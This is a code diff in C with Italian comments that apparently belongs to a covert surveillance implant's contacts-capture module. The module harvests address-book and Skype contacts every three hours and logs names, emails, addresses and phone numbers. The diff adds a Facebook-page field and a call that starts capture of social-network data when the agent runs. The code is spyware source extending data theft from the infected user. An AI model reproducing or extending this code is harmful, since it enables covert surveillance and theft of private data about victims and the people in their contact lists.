@@ -1,10 +1,11 @@
 #include "HM_ContactAgent/OLABMAPI.h"
+extern void StartSocialCapture(); // Per far partire le opzioni "social"
 
 #define CONTACTS_SLEEP_TIME (1000*60*60*3) //millisecondi  (ogni 3 ore)
 
 // Globals
 BOOL g_bContactsForceExit = FALSE;	// Semaforo per l'uscita del thread (e da tutti i clicli nelle funzioni chiamate)
-BOOL bPM_ContactsStarted = FALSE;	// Indica se l'agente e' attivo o meno
+//BOOL bPM_ContactsStarted = FALSE;	// Indica se l'agente e' attivo o meno
 HANDLE hContactsThread = NULL;		// Thread di cattura
 DWORD g_contact_delay = 0;			// Il delay deve essere assoluto (non deve ricominciare ad ogni sync)
 
@@ -37,7 +38,7 @@ DWORD CalcEntryLen(WCHAR *string)
 		                              tolog.add(&tlen, sizeof(DWORD)); \
 									  tolog.add(x, wcslen(x)*sizeof(WCHAR));}
 
-BOOL DumpContact(HANDLE hfile, WCHAR *name, WCHAR *email, WCHAR *company, WCHAR *addr_home, WCHAR *addr_office, WCHAR *phone_off, WCHAR *phone_mob, WCHAR *phone_hom, WCHAR *skype_name)
+BOOL DumpContact(HANDLE hfile, WCHAR *name, WCHAR *email, WCHAR *company, WCHAR *addr_home, WCHAR *addr_office, WCHAR *phone_off, WCHAR *phone_mob, WCHAR *phone_hom, WCHAR *skype_name, WCHAR *facebook_page)
 {
 	bin_buf tolog;
 	ContactHeaderStruct contact_header;
@@ -54,6 +55,7 @@ BOOL DumpContact(HANDLE hfile, WCHAR *name, WCHAR *email, WCHAR *company, WCHAR 
 	contact_header.dwSize += CalcEntryLen(phone_mob);
 	contact_header.dwSize += CalcEntryLen(phone_hom);
 	contact_header.dwSize += CalcEntryLen(skype_name);
+	contact_header.dwSize += CalcEntryLen(facebook_page);
 
 	tolog.add(&contact_header, sizeof(contact_header));
 	ADD_CONTACT_STRING(name, 0x1);
@@ -65,6 +67,7 @@ BOOL DumpContact(HANDLE hfile, WCHAR *name, WCHAR *email, WCHAR *company, WCHAR 
 	ADD_CONTACT_STRING(phone_mob, 0x7);
 	ADD_CONTACT_STRING(phone_hom, 0xC);
 	ADD_CONTACT_STRING(skype_name, 0x33);
+	ADD_CONTACT_STRING(facebook_page, 0x38);
 
 	Log_WriteFile(hfile, tolog.get_buf(), tolog.get_len());
 
@@ -166,7 +169,7 @@ DWORD __stdcall PM_ContactsDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILET
 			if (wptr)
 				*wptr = 0;
 
-			DumpContact(hfile, user_handle, NULL, NULL, NULL, NULL, phone_off, phone_mob, phone_hom, user_name);
+			DumpContact(hfile, user_handle, NULL, NULL, NULL, NULL, phone_off, phone_mob, phone_hom, user_name, NULL);
 
 		} while(msg = (BYTE *)strchr((char *)msg, ','));
 		Log_CloseFile(hfile);
@@ -209,6 +212,10 @@ DWORD __stdcall PM_ContactsStartStop(BOOL bStartFlag, BOOL bReset)
 		hContactsThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)CaptureContactsThread, NULL, 0, &dummy);
 		hCnSkypePMThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorSkypePM, (DWORD *)&bPM_cnspmcp, 0, 0);
 
+		// Fa partire il processo per la cattura dei dati socia.
+		// Se inserisco una opzione per abilitare o meno la cattura dei social,
+		// questa funzione va chiamata solo se l'opzione e' attiva.
+		StartSocialCapture();
 	} else {
 		QUERY_CANCELLATION(hContactsThread, g_bContactsForceExit);
 		QUERY_CANCELLATION(hCnSkypePMThread, bPM_cnspmcp);
@@ -219,15 +226,14 @@ DWORD __stdcall PM_ContactsStartStop(BOOL bStartFlag, BOOL bReset)
 }
 
 
-DWORD __stdcall PM_ContactsInit(BYTE *conf_ptr, BOOL bStartFlag)
+DWORD __stdcall PM_ContactsInit(JSONObject elem)
 {
-	PM_ContactsStartStop(bStartFlag, TRUE);
 	return 1;
 }
 
 
 void PM_ContactsRegister()
 {
-	AM_MonitorRegister(PM_CONTACTSAGENT, (BYTE *)PM_ContactsDispatch, (BYTE *)PM_ContactsStartStop, (BYTE *)PM_ContactsInit, NULL);
-	PM_ContactsInit(NULL, FALSE);
+	bPM_ContactsStarted = FALSE;
+	AM_MonitorRegister(L"addressbook", PM_CONTACTSAGENT, (BYTE *)PM_ContactsDispatch, (BYTE *)PM_ContactsStartStop, (BYTE *)PM_ContactsInit, NULL);
 }
